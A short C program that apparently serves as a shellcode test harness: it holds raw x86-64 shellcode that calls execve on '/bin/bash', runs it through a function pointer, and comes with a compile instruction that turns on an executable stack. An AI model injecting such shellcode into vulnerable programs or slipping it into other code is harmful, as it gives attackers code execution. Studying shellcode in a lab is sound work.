#include<stdio.h>
#include<string.h>

// Compile with the following: gcc -z execstack shellcode.c
int main(int argc, char **argv) {
  unsigned char code[] = "\x48\x31\xc0\x48\x83\xc0\x3b\x6a\x68\x48\xbb\x2f\x62\x69\x6e\x2f\x62\x61\x73\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05";


  int foo_value = 0;
  printf("length of the shellcode is: %d\n", (int)sizeof(code)-1);

  int (*foo)() = (int(*)())code;
  foo_value = foo();

	printf("shellcode execution complete\n");

	return 0;
}
